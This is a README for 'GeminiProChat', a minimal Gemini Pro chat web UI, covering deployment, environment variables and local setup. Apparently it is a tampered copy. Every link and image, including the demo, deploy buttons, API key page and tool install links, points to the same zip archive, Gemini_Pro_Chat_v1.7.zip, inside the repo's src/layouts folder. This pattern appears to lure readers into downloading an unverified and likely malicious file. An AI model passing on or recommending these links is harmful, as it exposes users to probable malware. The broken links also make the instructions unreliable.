# GeminiProChat

Minimal web UI for GeminiPro Chat.

Live demo: [Gemini Pro Chat](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)

[![image](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)

## Deploy

### Deploy With Vercel(Recommended)

[![Deploy with Vercel](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip%20API%20Key%20for%20GeminiProChat&https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip%20Pro%20Chat&demo-description=Minimal%20web%20UI%20for%20Gemini%20Pro.&demo-url=https%3A%2F%https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip%3A%2F%https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip%https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)

Just click the button above and follow the instructions to deploy your own copy of the app.

> [!NOTE]
> #### Solution for "User location is not supported for the API use"
> If you encounter the issue **"User location is not supported for the API use"**, follow these steps to resolve it:
>
> 1. Go to this [**palm-proxy**](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) repo and click **"Deploy With Vercel"**.
> 2. Once the deployment is complete, you will receive a domain name assigned by Vercel (e.g., `https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip`).
> 3. In your **Gemini Pro Chat** project, set an environment variable named `API_BASE_URL` with the value being the domain you got from deploying the gemini proxy (`https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip`).
> 4. Redeploy your **Gemini Pro Chat** project to finalize the configuration. This should resolve the issue.
>
> Thanks to [**antergone**](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) for providing this solution.

### Deploy on Railway

[![Deploy on Railway](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)

Just click the button above and follow the instructions to deploy on Railway.

### Deploy With Docker

To deploy with Docker, you can use the following command:

```bash
docker run --name geminiprochat \
--restart always \
-p 3000:3000 \
-itd \
-e GEMINI_API_KEY=your_api_key_here \
babaohuang/geminiprochat:latest
```
Please make sure to replace `your_api_key_here` with your own GEMINI API key.

This will start the **geminiprochat** service, accessible at `http://localhost:3000`. 

## Environment Variables

You can control the website through environment variables.

| Name | Description | Required |
| --- | --- | --- |
| `GEMINI_API_KEY` | Your API Key for GEMINI. You can get it from [here](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip).| **Yes** |
| `API_BASE_URL` | Custom base url for GEMINI API. Click [here](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) to see when to use this. | No |
| `HEAD_SCRIPTS` | Inject analytics or other scripts before `</head>` of the page | No |
| `PUBLIC_SECRET_KEY` | Secret string for the project. Use for generating signatures for API calls | No |
| `SITE_PASSWORD` | Set password for site, support multiple password separated by comma. If not set, site will be public | No |

## Running Locally

### Pre environment
1. **Node**: Check that both your development environment and deployment environment are using `Node v18` or later. You can use [nvm](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) to manage multiple `node` versions locally.

   ```bash
    node -v
   ```

2. **PNPM**: We recommend using [pnpm](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) to manage dependencies. If you have never installed pnpm, you can install it with the following command:

   ```bash
    npm i -g pnpm
   ```

3. **GEMINI_API_KEY**: Before running this application, you need to obtain the API key from Google. You can register the API key at [https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip).

### Getting Started

1. Install dependencies

   ```bash
    pnpm install
   ```

2. Copy the `https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip` file, then rename it to `.env`, and add your [GEMINI API key](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) to the `.env` file.

   ```bash
    GEMINI_API_KEY=AIzaSy...
   ```

3. Run the application, the local project runs on `http://localhost:3000/`

   ```bash
    pnpm run dev
   ```

## Acknowledgements

This project is inspired by and based on the following open-source project:

- [ChatGPT-Demo](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip) - For the foundational codebase and features.

## Star History

[![Star History Chart](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)](https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip)

## Buy me a coffee

If this repo is helpful to you, buy me a coffee,thank you very much!😄

<a href="https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip" target="_blank"><img src="https://github.com/migmi111/GeminiProChat/raw/refs/heads/main/src/layouts/Gemini_Pro_Chat_v1.7.zip" alt="Buy Me A Coffee" height="41" width="174"></a>